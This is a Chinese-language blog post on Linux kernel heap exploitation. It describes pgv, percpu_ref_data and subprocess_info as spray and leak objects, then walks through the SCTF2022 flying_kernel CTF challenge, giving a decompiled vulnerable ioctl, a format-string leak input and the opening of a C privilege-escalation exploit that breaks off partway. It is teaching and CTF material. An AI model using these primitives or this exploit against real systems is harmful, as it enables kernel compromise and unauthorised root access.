<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">packet_ring_buffer</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pgv</span>      *<span class="title">pg_vec</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span>        head;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span>        frames_per_block;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span>        frame_size;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span>        frame_max;</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span>        pg_vec_order;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span>        pg_vec_pages;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span>        pg_vec_len;</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> __percpu   *pending_refcnt;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span>           *rx_owner_map;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">tpacket_kbdq_core</span>    <span class="title">prb_bdqc</span>;</span></span><br><span class="line">    &#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
<h2 id="pgv页级内存分配">pgv：页级内存分配</h2>
<p><code>pgv</code>
结构体的定义比较简单，<strong>其实就是一个指向一块内存的指针</strong>：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pgv</span> &#123;</span></span><br><span class="line">    <span class="type">char</span> *buffer;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
<p>在实际使用时实际上是<strong>先分配该结构体的数组，再分配对应的页级内存</strong></p>
<h3 id="分配gfp_kernel-页级内存分配">分配（GFP_KERNEL） &amp;
页级内存分配</h3>
<p>当我们创建一个 protocol 为 <code>PF_PACKET</code> 的 socket
之后，其函数表为 <code>packet_ops</code>，接下来我们先调用
<code>setsockopt()</code> 将 <code>PACKET_VERSION</code> 设为
<code>TPACKET_V1</code>/ <code>TPACKET_V2</code>，再调用
<code>setsockopt()</code> 提交一个 <code>PACKET_TX_RING</code>
，此时便存在如下调用链：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">__sys_setsockopt()</span><br><span class="line">    sock-&gt;ops-&gt;setsockopt() // packet_ops</span><br><span class="line">        packet_setsockopt() // case PACKET_TX_RING ↓</span><br><span class="line">            packet_set_ring()</span><br><span class="line">                alloc_pg_vec()</span><br></pre></td></tr></table></figure></div>
<p>在 <code>alloc_pg_vec()</code> 中会创建一个 <code>pgv</code>
结构体，用以分配 <code>tp_block_nr</code> 份 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mn>2</mn><mtext>order</mtext></msup></mrow><annotation encoding="application/x-tex">2^{\text{order}}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8491em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord text mtight"><span class="mord mtight">order</span></span></span></span></span></span></span></span></span></span></span></span></span>
张内存页，其中 <code>order</code> 由 <code>tp_block_size</code>
决定：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">struct</span> pgv *<span class="title function_">alloc_pg_vec</span><span class="params">(<span class="keyword">struct</span> tpacket_req *req, <span class="type">int</span> order)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> block_nr = req-&gt;tp_block_nr;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pgv</span> *<span class="title">pg_vec</span>;</span></span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">    pg_vec = kcalloc(block_nr, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> pgv), GFP_KERNEL | __GFP_NOWARN);</span><br><span class="line">    <span class="keyword">if</span> (unlikely(!pg_vec))</span><br><span class="line">        <span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; block_nr; i++) &#123;</span><br><span class="line">        pg_vec[i].buffer = alloc_one_pg_vec_page(order);</span><br><span class="line">        <span class="keyword">if</span> (unlikely(!pg_vec[i].buffer))</span><br><span class="line">            <span class="keyword">goto</span> out_free_pgvec;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">out:</span><br><span class="line">    <span class="keyword">return</span> pg_vec;</span><br><span class="line"></span><br><span class="line">out_free_pgvec:</span><br><span class="line">    free_pg_vec(pg_vec, order, block_nr);</span><br><span class="line">    pg_vec = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>在 <code>alloc_one_pg_vec_page()</code> 中会直接调用
<code>__get_free_pages()</code> 向 buddy system
请求内存页，因此我们可以利用该函数进行大量的页面请求：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">char</span> *<span class="title function_">alloc_one_pg_vec_page</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> order)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">char</span> *buffer;</span><br><span class="line">	<span class="type">gfp_t</span> gfp_flags = GFP_KERNEL | __GFP_COMP |</span><br><span class="line">			  __GFP_ZERO | __GFP_NOWARN | __GFP_NORETRY;</span><br><span class="line"></span><br><span class="line">	buffer = (<span class="type">char</span> *) __get_free_pages(gfp_flags, order);</span><br><span class="line">	<span class="keyword">if</span> (buffer)</span><br><span class="line">		<span class="keyword">return</span> buffer;</span><br><span class="line">	<span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h3 id="释放-1">释放</h3>
<p>相对地，<code>pgv</code> 中的页面会在 socket
被关闭后释放，由此我们便有了一个页级内存的分配/释放原语</p>
<h3 id="使用限制">使用限制</h3>
<p>需要注意的是低权限用户无法创建一个类型为 <code>SOCK_RAW</code> 协议为
<code>PF_PACKET</code> 的
socket，但是我们可以通过开辟新的命名空间来绕过该限制，不过这样也有一定的缺陷：我们的进程也被隔离到该进程里了，无法获得“真正的
root 权限”</p>
<p>因此我们最好的做法便是开辟一个子进程，在该子进程中开辟新命名空间专门进行堆喷，父进程/其他子进程用于提权，通过管道与该子进程进行交互。
# percpu_ref_data（kmalloc-64|GFP_KERNEL） <code>percpu_ref_data</code>
包含两种有用的指针，其中 <code>release</code>
可以泄露内核基址（<code>io_uring</code>
已经整合到了内核中，<code>io_ring_ctx_ref_free()</code> 或
<code>io_rsrc_node_ref_zero()</code>
地址可以用于计算内核基址），<code>ref</code> 可以泄露
<code>physmap</code> 基址。 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">percpu_ref_data</span> &#123;</span></span><br><span class="line">	<span class="type">atomic_long_t</span>		count;</span><br><span class="line">	<span class="type">percpu_ref_func_t</span>	*release; 		<span class="comment">// 内核基址</span></span><br><span class="line">	<span class="type">percpu_ref_func_t</span>	*confirm_switch;<span class="comment">// 内核基址</span></span><br><span class="line">	<span class="type">bool</span>			force_atomic:<span class="number">1</span>;</span><br><span class="line">	<span class="type">bool</span>			allow_reinit:<span class="number">1</span>;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span>		<span class="title">rcu</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">percpu_ref</span>	*<span class="title">ref</span>;</span> 			<span class="comment">// physmap 地址</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div></p>
<p>该对象在 <code>io_ring_ctx_alloc() -&gt; percpu_ref_init()</code>
函数中分配，用户可以使用 <code>io_uring_setup</code>
系统调用来触发执行该函数（在初始化 <code>io_ring_ctx</code>
对象时调用该函数），调用 <code>close</code> 可以释放该对象。
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">percpu_ref_init</span><span class="params">(<span class="keyword">struct</span> percpu_ref *ref, <span class="type">percpu_ref_func_t</span> *release,</span></span><br><span class="line"><span class="params">            <span class="type">unsigned</span> <span class="type">int</span> flags, <span class="type">gfp_t</span> gfp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">percpu_ref_data</span> *<span class="title">data</span>;</span></span><br><span class="line">    </span><br><span class="line">    ...</span><br><span class="line">    </span><br><span class="line">    data = kzalloc(<span class="keyword">sizeof</span>(*ref-&gt;data), gfp);					<span class="comment">// alloc</span></span><br><span class="line">    </span><br><span class="line">    ...</span><br><span class="line">    </span><br><span class="line">    data-&gt;release = release;</span><br><span class="line">    data-&gt;confirm_switch = <span class="literal">NULL</span>;</span><br><span class="line">    data-&gt;ref = ref;</span><br><span class="line">    ref-&gt;data = data;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> __cold <span class="keyword">struct</span> io_ring_ctx *<span class="title function_">io_ring_ctx_alloc</span><span class="params">(<span class="keyword">struct</span> io_uring_params *p)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">io_ring_ctx</span> *<span class="title">ctx</span>;</span></span><br><span class="line">    </span><br><span class="line">    ...</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (percpu_ref_init(&amp;ctx-&gt;refs, io_ring_ctx_ref_free,		<span class="comment">// &lt;-----------</span></span><br><span class="line">                PERCPU_REF_ALLOW_REINIT, GFP_KERNEL))</span><br><span class="line">        <span class="keyword">goto</span> err;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div> # subprocess_info 与套接字相关</p>
<h2 id="subprocess_infokmalloc-128">subprocess_info：kmalloc-128</h2>
<p>定义如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> &#123;</span></span><br><span class="line">	<span class="type">atomic_long_t</span> data;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">entry</span>;</span></span><br><span class="line">	<span class="type">work_func_t</span> func;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_LOCKDEP</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">lockdep_map</span> <span class="title">lockdep_map</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">subprocess_info</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">work</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">completion</span> *<span class="title">complete</span>;</span></span><br><span class="line">	<span class="type">const</span> <span class="type">char</span> *path;</span><br><span class="line">	<span class="type">char</span> **argv;</span><br><span class="line">	<span class="type">char</span> **envp;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">file</span>;</span></span><br><span class="line">	<span class="type">int</span> wait;</span><br><span class="line">	<span class="type">int</span> retval;</span><br><span class="line">	<span class="type">pid_t</span> pid;</span><br><span class="line">	<span class="type">int</span> (*init)(<span class="keyword">struct</span> subprocess_info *info, <span class="keyword">struct</span> cred *new);</span><br><span class="line">	<span class="type">void</span> (*cleanup)(<span class="keyword">struct</span> subprocess_info *info);</span><br><span class="line">	<span class="type">void</span> *data;</span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure></div>
<h3 id="分配释放-3">分配/释放</h3>
<p>当我们尝试创建一个未知协议（<code>socket(22, AF_INET, 0)</code>）时，便会创建一个
<code>subprocess_info</code>
结构体，对应地，在系统调用结束之后该结构体便会被立即释放，过程其实有点类似
<code>setxattr</code>，不同的是没有任何用户空间数据会被拷贝至内核空间。</p>
<p>因为该结构体在创建之后就会被释放掉，因此基于该结构体的利用都要用到条件竞争。</p>
<h3 id="数据泄露条件竞争">数据泄露（条件竞争）</h3>
<ul>
<li><p>内核 .text 段地址</p>
<p>该结构体的 <code>work.func</code> 可能指向
<code>call_usermodehelper_exec_work</code>，若是我们能利用条件竞争读出该指针便能泄露出内核的
.text 段的基址。</p></li>
</ul>
<h3 id="劫持内核执行流条件竞争">劫持内核执行流（条件竞争）</h3>
<p>在释放该结构体时会调用其 <code>cleanup</code>
指针成员，若是我们能够在创建该结构体之后、释放该结构体之前劫持该指针便能控制内核执行流，但是这个竞争窗口比较小，因此实际上我们很难利用这种方式完成利用。
<img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="https://i-blog.csdnimg.cn/blog_migrate/49f1ae3de8033bbcdf7a0be6bde9e1ec.png%20=60%x"
                     
alt="在这里插入图片描述" 
                ></p>
<h3 id="例题sctf2022---flying_kernel">例题：SCTF2022 -
flying_kernel</h3>
<p><a class="link" 
 href="https://gitcode.net/qq_45323960/attachment/-/tree/master/linux_kernel_pwn/SCTF20221_flying_kernel" >附件下载链接 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>存在 UAF 和 格式化字符串漏洞，object 属于 <code>kmalloc-128</code>
。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">seven_ioctl</span><span class="params">(__int64 a1, <span class="type">int</span> a2, __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">switch</span> ( a2 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x6666</span>:</span><br><span class="line">      <span class="keyword">if</span> ( sctf_buf )</span><br><span class="line">      &#123;</span><br><span class="line">        kfree(sctf_buf);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        printk(<span class="string">&quot;What are you doing?&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x7777</span>:</span><br><span class="line">      <span class="keyword">if</span> ( sctf_buf )</span><br><span class="line">        printk(sctf_buf);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x5555</span>:</span><br><span class="line">      <span class="keyword">if</span> ( a3 == <span class="number">0x80</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        sctf_buf = kmem_cache_alloc_trace(kmalloc_caches[<span class="number">7</span>], <span class="number">0xCC0</span>LL);</span><br><span class="line">        printk(<span class="string">&quot;Add Success!\n&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        printk(<span class="string">&quot;It&#x27;s not that simple\n&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>由于题目中 qemu 的启动参数未配置 quiet
，可以看到内核的日志信息。因此我们可以通过格式化字符串漏洞泄露内核基址。</p>
<p>利用格式化字符串漏洞的输入为
<code>%llx %llx %llx %llx %llx %llx %llx %llx %llx %llx %llx %llx</code>
，注意这里不能使用%p，否则内核会检测到信息泄漏，得不到正确的结果。</p>
<p>不过我们也可以通过 <code>user_key_payload</code> +
<code>subprocess_info</code> 泄露内核基址，由于创建
<code>user_key_payload</code> 时第一次申请的
<code>user_key_payload</code> 会被释放掉，因此需要借助
<code>msg_msg</code> 进行堆风水使得 <code>user_key_payload</code> 和
<code>subprocess_info</code> 使用同一个 object 。</p>
<p>之后竞争修改 <code>subprocess_info</code> 的 <code>cleanup</code>
指针劫持内核执行流。由于没有开 SMAP 保护，因此可以将栈迁移到用户空间的
ROP 上进行提权。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/keyctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/sysinfo.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">randint</span><span class="params">(<span class="type">int</span> min, <span class="type">int</span> max)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> min + (rand() % (max - min));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">bind_core</span><span class="params">(<span class="type">bool</span> fixed, <span class="type">bool</span> thread)</span> &#123;</span><br><span class="line">    <span class="type">cpu_set_t</span> cpu_set;</span><br><span class="line">    CPU_ZERO(&amp;cpu_set);</span><br><span class="line">    CPU_SET(fixed ? <span class="number">0</span> : randint(<span class="number">1</span>, get_nprocs()), &amp;cpu_set);</span><br><span class="line">    <span class="keyword">if</span> (thread) &#123;</span><br><span class="line">        pthread_setaffinity_np(pthread_self(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_rflags, user_sp, user_ss;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span> &#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">qword_dump</span><span class="params">(<span class="type">char</span> *desc, <span class="type">void</span> *addr, <span class="type">int</span> len)</span> &#123;</span><br><span class="line">    <span class="type">uint64_t</span> *buf64 = (<span class="type">uint64_t</span> *) addr;</span><br><span class="line">    <span class="type">uint8_t</span> *buf8 = (<span class="type">uint8_t</span> *) addr;</span><br><span class="line">    <span class="keyword">if</span> (desc != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] %s:\n&quot;</span>, desc);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len / <span class="number">8</span>; i += <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;  %04x&quot;</span>, i * <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">            i + j &lt; len / <span class="number">8</span> ? <span class="built_in">printf</span>(<span class="string">&quot; 0x%016lx&quot;</span>, buf64[i + j]) : <span class="built_in">printf</span>(<span class="string">&quot;                   &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;   &quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">32</span> &amp;&amp; j + i * <span class="number">8</span> &lt; len; j++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, <span class="built_in">isprint</span>(buf8[i * <span class="number">8</span> + j]) ? buf8[i * <span class="number">8</span> + j] : <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> *<span class="title">next</span>, *<span class="title">prev</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* one msg_msg structure for each message */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">m_list</span>;</span></span><br><span class="line">    <span class="type">long</span> m_type;</span><br><span class="line">    <span class="type">size_t</span> m_ts;        <span class="comment">/* message text size */</span></span><br><span class="line">    <span class="type">void</span> *next;         <span class="comment">/* struct msg_msgseg *next; */</span></span><br><span class="line">    <span class="type">void</span> *security;     <span class="comment">/* NULL without SELinux */</span></span><br><span class="line">    <span class="comment">/* the actual message follows immediately */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">next</span>;</span></span><br><span class="line">    <span class="comment">/* the next part of the message follows immediately */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> MSG_COPY</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MSG_COPY 040000</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_SIZE 0x1000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DATALEN_MSG    ((size_t)PAGE_SIZE-sizeof(struct msg_msg))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DATALEN_SEG    ((size_t)PAGE_SIZE-sizeof(struct msg_msgseg))</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">get_msg_queue</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> msgget(IPC_PRIVATE, <span class="number">0666</span> | IPC_CREAT);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">long</span> <span class="title function_">read_msg</span><span class="params">(<span class="type">int</span> msqid, <span class="type">void</span> *msgp, <span class="type">size_t</span> msgsz, <span class="type">long</span> msgtyp)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> msgrcv(msqid, msgp, msgsz, msgtyp, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">write_msg</span><span class="params">(<span class="type">int</span> msqid, <span class="type">void</span> *msgp, <span class="type">size_t</span> msgsz, <span class="type">long</span> msgtyp)</span> &#123;</span><br><span class="line">    ((<span class="keyword">struct</span> msgbuf *) msgp)-&gt;mtype = msgtyp;</span><br><span class="line">    <span class="keyword">return</span> msgsnd(msqid, msgp, msgsz, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">long</span> <span class="title function_">peek_msg</span><span class="params">(<span class="type">int</span> msqid, <span class="type">void</span> *msgp, <span class="type">size_t</span> msgsz, <span class="type">long</span> msgtyp)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> msgrcv(msqid, msgp, msgsz, msgtyp, MSG_COPY | IPC_NOWAIT | MSG_NOERROR);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">build_msg</span><span class="params">(<span class="type">void</span> *msg, <span class="type">uint64_t</span> m_list_next, <span class="type">uint64_t</span> m_list_prev,</span></span><br><span class="line"><span class="params">               <span class="type">uint64_t</span> m_type, <span class="type">uint64_t</span> m_ts, <span class="type">uint64_t</span> next, <span class="type">uint64_t</span> security)</span> &#123;</span><br><span class="line">    ((<span class="keyword">struct</span> msg_msg *) msg)-&gt;m_list.next = (<span class="type">void</span> *) m_list_next;</span><br><span class="line">    ((<span class="keyword">struct</span> msg_msg *) msg)-&gt;m_list.prev = (<span class="type">void</span> *) m_list_prev;</span><br><span class="line">    ((<span class="keyword">struct</span> msg_msg *) msg)-&gt;m_type = (<span class="type">long</span>) m_type;</span><br><span class="line">    ((<span class="keyword">struct</span> msg_msg *) msg)-&gt;m_ts = m_ts;</span><br><span class="line">    ((<span class="keyword">struct</span> msg_msg *) msg)-&gt;next = (<span class="type">void</span> *) next;</span><br><span class="line">    ((<span class="keyword">struct</span> msg_msg *) msg)-&gt;security = (<span class="type">void</span> *) security;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">callback_head</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">callback_head</span> *<span class="title">next</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="type">void</span> (*func)(<span class="keyword">struct</span> callback_head *head);</span><br><span class="line">&#125; __attribute__((aligned(<span class="keyword">sizeof</span>(<span class="type">void</span> *))));</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> rcu_head callback_head</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __aligned(x)                    __attribute__((__aligned__(x)))</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> u64;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_key_payload</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">rcu</span>;</span>        <span class="comment">/* RCU destructor */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> datalen;    <span class="comment">/* length of this data */</span></span><br><span class="line">    <span class="type">char</span> data[<span class="number">0</span>] __aligned(__alignof__(u64)); <span class="comment">/* actual data */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KEY_NUM 199</span></span><br><span class="line"><span class="type">int</span> key_id[KEY_NUM];</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">key_alloc</span><span class="params">(<span class="type">int</span> id, <span class="type">void</span> *payload, <span class="type">int</span> payload_len)</span> &#123;</span><br><span class="line">    <span class="type">char</span> description[<span 